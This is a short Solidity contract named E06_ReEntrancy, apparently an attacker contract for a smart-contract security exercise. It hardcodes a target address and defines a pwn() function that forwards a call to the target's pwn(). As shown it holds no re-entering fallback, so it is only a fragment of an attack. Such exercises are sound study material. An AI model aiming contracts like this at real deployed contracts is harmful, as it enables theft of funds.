// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract E06_ReEntrancy {
    address TARGET = 0xcAbFe0b80E9A230CFfe00F39c5aeEAeC9541f169;

    constructor() payable {
    }

    function pwn() external {
        address(TARGET).call(abi.encodeWithSignature("pwn()"));
    }
}

